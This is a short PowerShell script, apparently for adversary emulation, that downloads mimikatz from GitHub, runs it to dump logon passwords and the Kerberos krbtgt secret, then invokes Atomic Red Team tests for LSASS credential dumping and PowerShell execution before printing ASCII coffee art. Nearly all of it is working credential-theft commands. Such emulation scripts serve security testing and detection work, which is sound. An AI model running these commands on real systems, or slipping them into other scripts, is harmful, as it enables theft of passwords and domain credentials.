Write-Host "Run some Katz"

$mimikatz_path = 'c:\temp\mimikatz.exe'
If (-not (Test-Path $mimikatz_path)) {
    $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
    Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
    Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
    New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
    Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
} else {
  Write-Host "$('[{0:HH:mm}]' -f (Get-Date)) katz is already downloaded."
}





C:\temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
C:\temp\mimikatz.exe SEKURLSA::Krbtgt exit


Write-Host "Run some Atomics"
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

Invoke-AtomicTest T1003.001 -GetPrereqs

Invoke-AtomicTest T1003.001
Write-Host "Invoke the Katz"
Invoke-AtomicTest T1059.001 -GetPrereqs
Invoke-AtomicTest T1059.001 -TestNumbers 1

Start-Sleep -Seconds 5

cls

$coffee =  @"
    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'
"@

$coffee  